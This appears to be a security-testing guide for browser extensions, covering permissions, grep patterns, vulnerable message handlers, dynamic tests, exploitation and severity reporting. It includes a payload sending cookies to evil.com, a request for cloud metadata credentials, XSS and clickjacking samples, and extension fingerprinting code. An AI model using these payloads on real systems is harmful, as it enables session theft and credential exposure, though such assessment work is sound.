# Browser Extension Security Testing

Testing browser extensions (Chrome, Firefox, Edge) for security vulnerabilities. Use when target organization deploys custom extensions or when extensions are in scope.

---

## Architecture

```text
Browser Extension Components:
├── manifest.json          — Configuration, permissions, CSP
├── Background script      — Persistent logic (service worker in MV3)
├── Content scripts        — Injected into web pages (DOM access)
├── Popup/Options UI       — Extension UI pages
├── Web accessible resources — Files accessible by web pages
└── Native messaging       — Communication with native apps
```

## Reconnaissance

### Extracting Extensions

```bash
# Chrome extension locations
# macOS
~/Library/Application Support/Google/Chrome/Default/Extensions/

# Linux
~/.config/google-chrome/Default/Extensions/

# Windows
%LOCALAPPDATA%\Google\Chrome\User Data\Default\Extensions\

# Firefox
~/.mozilla/firefox/PROFILE/extensions/

# Download CRX directly (by extension ID)
curl -o extension.crx "https://clients2.google.com/service/update2/crx?response=redirect&prodversion=100.0&x=id%3DEXTENSION_ID%26installsource%3Dondemand%26uc"

# Unpack
unzip extension.crx -d extension_unpacked/
# Firefox XPI is just a ZIP
unzip extension.xpi -d extension_unpacked/
```

### Enterprise Extension Discovery

```bash
# Windows registry (force-installed extensions)
reg query "HKLM\SOFTWARE\Policies\Google\Chrome\ExtensionInstallForcelist"
reg query "HKLM\SOFTWARE\Policies\Mozilla\Firefox\Extensions"

# macOS managed preferences
defaults read com.google.Chrome ExtensionInstallForcelist
```

---

## Static Analysis

### Manifest.json — Critical Permissions

| Permission | Risk | Why |
|-----------|------|-----|
| `<all_urls>` | Critical | Access to ALL websites |
| `webRequest` + `webRequestBlocking` | Critical | Intercept/modify ALL traffic |
| `cookies` | High | Read/write cookies for any domain |
| `nativeMessaging` | High | Execute native code |
| `management` | High | Control other extensions |
| `clipboardRead` | Medium | Read clipboard (passwords, tokens) |
| `history` | Medium | Full browsing history |
| `tabs` | Medium | See all open tabs/URLs |
| `downloads` | Medium | Trigger/manage downloads |
| `activeTab` | Low | Only current tab, user-triggered |

### Dangerous Code Patterns

```bash
# Search for dangerous patterns in unpacked extension
grep -rn "eval(" extension_unpacked/
grep -rn "innerHTML" extension_unpacked/
grep -rn "document.write" extension_unpacked/
grep -rn "chrome.tabs.executeScript" extension_unpacked/
grep -rn "chrome.scripting.executeScript" extension_unpacked/
grep -rn "new Function(" extension_unpacked/
grep -rn "XMLHttpRequest\|fetch(" extension_unpacked/
grep -rn "postMessage" extension_unpacked/
grep -rn "chrome.runtime.sendMessage" extension_unpacked/

# Hardcoded secrets
grep -rn "api_key\|apikey\|secret\|password\|token\|AWS_" extension_unpacked/

# Unsafe CSP
grep -rn "unsafe-eval\|unsafe-inline" extension_unpacked/

# External script loading
grep -rn "src=.*http" extension_unpacked/
```

---

## Common Vulnerabilities

### 1. Message Passing — No Origin Validation (Critical)

```javascript
// VULNERABLE: Content script forwards all messages to background
window.addEventListener('message', function(event) {
  // No origin check! Any webpage can trigger this
  chrome.runtime.sendMessage(event.data);
});

// VULNERABLE: Background script trusts all messages blindly
chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
  if (message.action === 'executeCode') {
    eval(message.code);  // RCE in extension context!
  }
});

// ATTACK: From any malicious webpage
window.postMessage({
  action: 'executeCode',
  code: 'fetch("https://evil.com/steal?cookies=" + document.cookie)'
}, '*');
```

### 2. Extension as CORS Proxy (High)

```javascript
// VULNERABLE: Extension proxies arbitrary requests (bypasses CORS)
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
  if (request.action === 'fetch') {
    fetch(request.url)  // No URL validation!
      .then(r => r.text())
      .then(sendResponse);
    return true;
  }
});

// ATTACK: Use extension to reach internal services
chrome.runtime.sendMessage('EXTENSION_ID', {
  action: 'fetch',
  url: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/'
}, response => console.log(response));
```

### 3. XSS in Extension Context (High)

```javascript
// VULNERABLE: innerHTML with untrusted data
document.getElementById('output').innerHTML = userInput;

// VULNERABLE: eval with response data
eval(response.code);

// VULNERABLE: Dynamic script creation
let script = document.createElement('script');
script.src = untrustedUrl;
document.body.appendChild(script);

// ATTACK via extension messaging:
chrome.runtime.sendMessage(extensionId, {
  action: 'display',
  data: '<img src=x onerror=alert(document.cookie)>'
});
```

### 4. Web Accessible Resources Abuse (Medium)

```javascript
// If manifest.json exposes sensitive scripts:
"web_accessible_resources": [{
  "resources": ["sensitive.js", "config.json"],
  "matches": ["<all_urls>"]
}]

// ATTACK: Any webpage can load these
// <script src="chrome-extension://EXTENSION_ID/sensitive.js"></script>
// fetch("chrome-extension://EXTENSION_ID/config.json").then(r => r.json())
```

### 5. Insecure External Communication (Medium)

```javascript
// VULNERABLE: HTTP instead of HTTPS
fetch('http://api.example.com/data');

// VULNERABLE: Sending sensitive data to third parties
fetch('https://analytics.example.com', {
  method: 'POST',
  body: JSON.stringify({
    url: window.location.href,
    cookies: document.cookie
  })
});
```

### 6. Storage Exposure (Medium)

```javascript
// Sensitive data in unencrypted chrome.storage
chrome.storage.local.set({
  api_key: 'secret123',
  user_token: 'jwt...'
});

// Accessible via XSS in extension context or other extensions
chrome.storage.local.get(null, data => console.log(data));
```

---

## Dynamic Testing

### Extension Debugging

```text
Chrome:
1. chrome://extensions → Enable "Developer mode"
2. "Load unpacked" → select extension directory
3. Click "Inspect views" for background script
4. Right-click popup → Inspect for popup debugging

Firefox:
1. about:debugging → "This Firefox"
2. "Load Temporary Add-on" → select manifest.json
3. Click "Inspect" for debugging
```

### Testing Message Passing

```javascript
// From DevTools console on any page:

// Test external messaging (if externally_connectable)
chrome.runtime.sendMessage('EXTENSION_ID', {
  test: 'payload'
}, response => console.log(response));

// Test postMessage (if content script listens)
window.postMessage({
  type: 'extension_message',
  data: '<script>alert(1)</script>'
}, '*');

// Test prototype pollution via messaging
chrome.runtime.sendMessage('EXTENSION_ID', {
  '__proto__': { 'polluted': true }
});
```

### Extension ID Enumeration (Fingerprinting)

```javascript
// Detect installed extensions via web accessible resources
const knownExtensions = [
  { id: 'cjpalhdlnbpafiamejdnhcphjbkeiagm', name: 'uBlock Origin' },
  { id: 'gighmmpiobklfepjocnamgkkbiglidom', name: 'AdBlock' },
  // Add target-specific extension IDs
];

knownExtensions.forEach(ext => {
  const img = new Image();
  img.onload = () => console.log(`INSTALLED: ${ext.name} (${ext.id})`);
  img.onerror = () => {};
  img.src = `chrome-extension://${ext.id}/icon.png`;
});
```

---

## Exploitation Techniques

### Clickjacking Extension UI

```html
<!-- If extension popup/options page is frameable -->
<style>
  iframe { position: absolute; opacity: 0.01; z-index: 999; }
</style>
<iframe src="chrome-extension://EXTENSION_ID/popup.html"></iframe>
<button style="position:relative; z-index:1">Click me!</button>
```

### Native Messaging Exploitation

```bash
# Find native host manifests
# macOS
~/Library/Application Support/Google/Chrome/NativeMessagingHosts/

# Linux
~/.config/google-chrome/NativeMessagingHosts/

# If native app has command injection:
# Extension sends user-controlled data → native app executes
# Test: inject shell metacharacters in extension inputs
```

### Privilege Escalation Chain

```text
Typical attack chain:
1. XSS on any website (content script context)
2. → Message to background script (extension context)
3. → Background script has <all_urls> + cookies permission
4. → Read cookies for any domain (session hijack)
5. → Or: native messaging → RCE on host machine

Key insight: XSS in extension context is MORE powerful than
regular XSS because extensions have elevated permissions.
```

---

## Testing Checklist

### Static Analysis
- [ ] Review manifest.json permissions (flag dangerous ones)
- [ ] Check content_security_policy (unsafe-eval/inline?)
- [ ] Analyze background script for eval/innerHTML/Function()
- [ ] Analyze content scripts for DOM manipulation
- [ ] Review web_accessible_resources (sensitive files exposed?)
- [ ] Check externally_connectable (who can message?)
- [ ] Search for hardcoded secrets/API keys
- [ ] Check for vulnerable dependencies (retire.js)
- [ ] Review update mechanism (auto-update from where?)

### Dynamic Analysis
- [ ] Test message passing security (origin validation?)
- [ ] Check for XSS in extension popup/options UI
- [ ] Test CORS bypass potential (extension as proxy)
- [ ] Analyze network traffic (sensitive data transmission?)
- [ ] Check chrome.storage contents (secrets in plaintext?)
- [ ] Test native messaging (if used) for injection
- [ ] Verify CSP enforcement in extension pages

### Exploitation
- [ ] Attempt XSS injection via messaging
- [ ] Test privilege escalation (content → background → native)
- [ ] Check for clickjacking on extension UI
- [ ] Test extension as SSRF/CORS proxy
- [ ] Enumerate other installed extensions
- [ ] Test for prototype pollution via messages

---

## Tools

```bash
# Retire.js — Check for vulnerable JS libraries
retire --jspath extension_unpacked/

# CRXcavator — Automated security analysis
# https://crxcavator.io/

# Tarnish — Chrome extension analyzer
# https://thehackerblog.com/tarnish/

# Extension Source Viewer (Chrome extension for quick analysis)
# Chrome Web Store: "CRX Viewer"

# semgrep rules for extensions
# https://github.com/nickcapurso/browser-extension-security-rules
```

---

## Reporting Guidance

| Finding | Severity | Condition |
|---------|----------|-----------|
| No origin validation in message handler | Critical | If background script has dangerous permissions |
| Extension as unrestricted CORS proxy | High | If reachable from web pages |
| XSS in extension context | High | Elevated vs regular XSS due to permissions |
| Hardcoded API keys/secrets | Medium-High | Depends on key scope |
| Sensitive data in chrome.storage (unencrypted) | Medium | If accessible via XSS |
| Overly broad permissions | Low-Medium | Informational unless exploitable |
| Missing CSP or unsafe-eval | Medium | Enables code injection |
| Web accessible resources expose config | Medium | If contains secrets/internal URLs |

**Key principle:** Browser extension vulnerabilities are often MORE severe than equivalent web vulnerabilities because extensions operate with elevated privileges (cross-origin access, cookie access, native messaging). An XSS in an extension with `<all_urls>` permission is effectively a universal XSS across all websites.
